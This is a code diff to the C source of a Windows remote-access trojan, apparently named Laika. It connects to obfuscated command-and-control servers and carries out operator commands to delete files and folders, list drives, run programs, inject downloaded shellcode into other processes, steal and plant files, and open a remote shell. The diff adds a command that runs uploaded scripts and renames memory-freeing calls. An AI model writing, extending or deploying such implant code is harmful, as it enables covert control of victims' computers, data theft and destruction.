@@ -1,4 +1,5 @@
 #include "libc.h"
+#include "../pasm/include/pasm.h"
 
 #include <Windows.h>
 #include <wininet.h>
@@ -8,6 +9,7 @@
 #include "utils.h"
 #include "config.h"
 #include "resolve_apis.h"
+#include "libc.h"
 #include "file_explorer.h"
 
 #define SHELLCODE
@@ -50,7 +52,7 @@ DWORD WINAPI redirect_i_thread(LPVOID lpParameter) {
 		}
 	}
 
-	Api.HeapFree(_crt_heap, 0, buffer);
+	Api.Heapfree_(_crt_heap, 0, buffer);
 	return 0;
 }
 
@@ -86,7 +88,7 @@ DWORD WINAPI redirect_o_thread(LPVOID lpParameter) {
 			}
 		}
 	}
-	Api.HeapFree(_crt_heap, 0, buffer);
+	Api.Heapfree_(_crt_heap, 0, buffer);
 	return 0;
 }
 
@@ -162,7 +164,7 @@ retry:
 		serv = 0;
 	}
 
-	//on fait une copie de l'ip chiffrée, puis on la free
+	//on fait une copie de l'ip chiffrée, puis on la free_
 	//ça évite qu'elle reste dans la mémoire trop longtemps
 	//ça évite aussi qu'on utilise CAESAR_DECRYPT sur une ip déjà décryptée
 	size_t len = strlen(fallback_servers[serv]);
@@ -171,7 +173,7 @@ retry:
 
 	server.sin_addr.s_addr = Api.inet_addr(CAESAR_DECRYPT(Tmp));
 
-	Api.HeapFree(_crt_heap, 0, Tmp);
+	Api.Heapfree_(_crt_heap, 0, Tmp);
 
 	server.sin_port = Api.htons(fallback_servers_ip[serv]);
 
@@ -211,14 +213,14 @@ retry:
 			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
 			{
 				//recv failed
-				Api.HeapFree(_crt_heap, 0, path);
+				Api.Heapfree_(_crt_heap, 0, path);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
 
 			Api.DeleteFileA(CAESAR_DECRYPT(path));
 
-			Api.HeapFree(_crt_heap, 0, path);
+			Api.Heapfree_(_crt_heap, 0, path);
 		}
 
 		if (strncmp_(server_reply, "ijqdinw", strlen("ijqdinw")) == 0) { //del_dir
@@ -228,7 +230,7 @@ retry:
 			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
 			{
 				//recv failed
-				Api.HeapFree(_crt_heap, 0, path);
+				Api.Heapfree_(_crt_heap, 0, path);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
@@ -237,8 +239,8 @@ retry:
 
 			delete_folder(wstr);
 
-			Api.HeapFree(_crt_heap, 0, (LPWSTR)wstr);
-			Api.HeapFree(_crt_heap, 0, path);
+			Api.Heapfree_(_crt_heap, 0, (LPWSTR)wstr);
+			Api.Heapfree_(_crt_heap, 0, path);
 		}
 
 		if (strncmp_(server_reply, "ljydtgodnskt", strlen("ljydtgodnskt")) == 0) { //get_obj_info
@@ -248,12 +250,12 @@ retry:
 			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
 			{
 				//recv failed
-				Api.HeapFree(_crt_heap, 0, path);
+				Api.Heapfree_(_crt_heap, 0, path);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
 			char infos = get_obj_info(CAESAR_DECRYPT(path));
-			Api.HeapFree(_crt_heap, 0, path);
+			Api.Heapfree_(_crt_heap, 0, path);
 			if (Api.send(sock, &infos, 1, 0) < 0) {
 				//send failed
 				Sleep_(Sleep_TIME);
@@ -268,12 +270,12 @@ retry:
 
 			if (Api.send(sock, drives, strlen(drives), 0) < 0) {
 				//send failed
-				Api.HeapFree(_crt_heap, 0, drives);
+				Api.Heapfree_(_crt_heap, 0, drives);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
 
-			Api.HeapFree(_crt_heap, 0, drives);
+			Api.Heapfree_(_crt_heap, 0, drives);
 		}
 
 		if (strncmp_(server_reply, "j}jhzyj", strlen("j}jhzyj")) == 0) { //execute
@@ -286,7 +288,7 @@ retry:
 			memset_(&pi, 0, sizeof(pi));
 
 			if (Api.recv(sock, path, MAX_PATH, 0) <= 0) {
-				Api.HeapFree(_crt_heap, 0, path);
+				Api.Heapfree_(_crt_heap, 0, path);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
@@ -304,7 +306,7 @@ retry:
 				&pi          // Pointer to PROCESS_INFORMATION structure
 			);
 
-			Api.HeapFree(_crt_heap, 0, path);
+			Api.Heapfree_(_crt_heap, 0, path);
 		}
 
 #ifdef SHELLCODE
@@ -313,7 +315,7 @@ retry:
 
 			if (Api.recv(sock, arch, 2, 0) <= 0) {
 				//send failed
-				Api.HeapFree(_crt_heap, 0, arch);
+				Api.Heapfree_(_crt_heap, 0, arch);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
@@ -335,11 +337,11 @@ retry:
 				proc = FindProcessByArch(L"x64");
 			}
 
-			Api.HeapFree(_crt_heap, 0, arch);
+			Api.Heapfree_(_crt_heap, 0, arch);
 
 			if (proc == NULL) {
 				Api.send(sock, "fail", strlen("fail"), 0);
-				Api.HeapFree(_crt_heap, 0, file);
+				Api.Heapfree_(_crt_heap, 0, file);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
@@ -347,7 +349,7 @@ retry:
 			LPVOID addr = Api.VirtualAllocEx(proc, NULL, fsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 			if (addr == NULL) {
 				Api.send(sock, "fail", strlen("fail"), 0);
-				Api.HeapFree(_crt_heap, 0, file);
+				Api.Heapfree_(_crt_heap, 0, file);
 				Api.CloseHandle(proc);
 				Sleep_(Sleep_TIME);
 				goto retry;
@@ -355,7 +357,7 @@ retry:
 
 			if (Api.WriteProcessMemory(proc, addr, file, fsize, NULL) == 0) {
 				Api.send(sock, "fail", strlen("fail"), 0);
-				Api.HeapFree(_crt_heap, 0, file);
+				Api.Heapfree_(_crt_heap, 0, file);
 				Api.CloseHandle(proc);
 				Sleep_(Sleep_TIME);
 				goto retry;
@@ -364,13 +366,13 @@ retry:
 			HANDLE hThread = Api.CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
 			if (hThread == NULL) {
 				Api.send(sock, "fail", strlen("fail"), 0);
-				Api.HeapFree(_crt_heap, 0, file);
+				Api.Heapfree_(_crt_heap, 0, file);
 				Api.CloseHandle(proc);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
 
-			Api.HeapFree(_crt_heap, 0, file);
+			Api.Heapfree_(_crt_heap, 0, file);
 			Api.CloseHandle(proc);
 			Api.CloseHandle(hThread);
 			Api.send(sock, "ok", strlen("ok"), 0);
@@ -384,8 +386,8 @@ retry:
 			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
 			{
 				//recv failed
-				Api.HeapFree(_crt_heap, 0, file_list);
-				Api.HeapFree(_crt_heap, 0, path);
+				Api.Heapfree_(_crt_heap, 0, file_list);
+				Api.Heapfree_(_crt_heap, 0, path);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
@@ -394,8 +396,8 @@ retry:
 			file_list = get_file_list(CAESAR_DECRYPT(path), &num_files);
 
 			if (file_list == NULL) {
-				Api.HeapFree(_crt_heap, 0, file_list);
-				Api.HeapFree(_crt_heap, 0, path);
+				Api.Heapfree_(_crt_heap, 0, file_list);
+				Api.Heapfree_(_crt_heap, 0, path);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
@@ -403,13 +405,13 @@ retry:
 
 			if (Api.send(sock, file_list, strlen(file_list), 0) < 0) {
 				//send failed
-				Api.HeapFree(_crt_heap, 0, file_list);
-				Api.HeapFree(_crt_heap, 0, path);
+				Api.Heapfree_(_crt_heap, 0, file_list);
+				Api.Heapfree_(_crt_heap, 0, path);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
 
-			Api.HeapFree(_crt_heap, 0, path);
+			Api.Heapfree_(_crt_heap, 0, path);
 		}
 
 		if (strncmp_(server_reply, "it|sqtfidknqj", strlen("it|sqtfidknqj")) == 0) { //download_file
@@ -419,13 +421,13 @@ retry:
 			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
 			{
 				//recv failed
-				Api.HeapFree(_crt_heap, 0, path);
+				Api.Heapfree_(_crt_heap, 0, path);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
 
 			HANDLE hFile = Api.CreateFileA(CAESAR_DECRYPT(path), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-			Api.HeapFree(_crt_heap, 0, path);
+			Api.Heapfree_(_crt_heap, 0, path);
 
 			if (hFile == NULL)
 			{
@@ -446,7 +448,7 @@ retry:
 			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
 			{
 				//recv failed
-				Api.HeapFree(_crt_heap, 0, path);
+				Api.Heapfree_(_crt_heap, 0, path);
 				Sleep_(Sleep_TIME);
 				goto retry;
 			}
@@ -455,17 +457,17 @@ retry:
 
 			HANDLE file_handle = Api.CreateFileW(wstr, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 			if (file_handle == INVALID_HANDLE_VALUE) {
-				Api.HeapFree(_crt_heap, 0, path);
-				Api.HeapFree(_crt_heap, 0, (LPWSTR)wstr);
+				Api.Heapfree_(_crt_heap, 0, path);
+				Api.Heapfree_(_crt_heap, 0, (LPWSTR)wstr);
 				goto retry;
 			}
 
-			Api.HeapFree(_crt_heap, 0, (LPWSTR)wstr);
+			Api.Heapfree_(_crt_heap, 0, (LPWSTR)wstr);
 
 			upload_file(sock, file_handle);
 
 			Api.CloseHandle(file_handle);
-			Api.HeapFree(_crt_heap, 0, path);
+			Api.Heapfree_(_crt_heap, 0, path);
 		}
 
 		if (strncmp_(server_reply, "xmjqq", strlen("xmjqq")) == 0) { //shell
@@ -591,11 +593,37 @@ retry:
 				goto retry;
 			}
 		}
+
+		if (strncmp_(server_reply, "ufxr", strlen("ufxr")) == 0) { //pasm
+			size_t fsize = 0;
+			char* file = upload_file_to_mem(sock, &fsize);
+			if (file == NULL) {
+				Api.send(sock, "fail", strlen("fail"), 0);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
+
+			int line_count = 0;
+			char** lines = split_lines(file, &line_count);
+			if (lines == NULL) {
+				Api.send(sock, "fail", strlen("fail"), 0);
+				Api.Heapfree_(_crt_heap, 0, file);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
+
+			pasm_run_script(NULL, lines, line_count, sock);
+
+			Api.send(sock, "Qfnpf?%jsi%tk%xhwnuy", strlen("Qfnpf?%jsi%tk%xhwnuy"), 0); //Laika: end of script
+			Api.Heapfree_(_crt_heap, 0, file);
+			if (lines != NULL)
+				Api.Heapfree_(_crt_heap, 0, lines);
+		}
 	}
 	/* Never used
 	Api.closesocket(sock);
 
-	FreeApis();
+	free_Apis();
 	*/
 	return 0;
 }
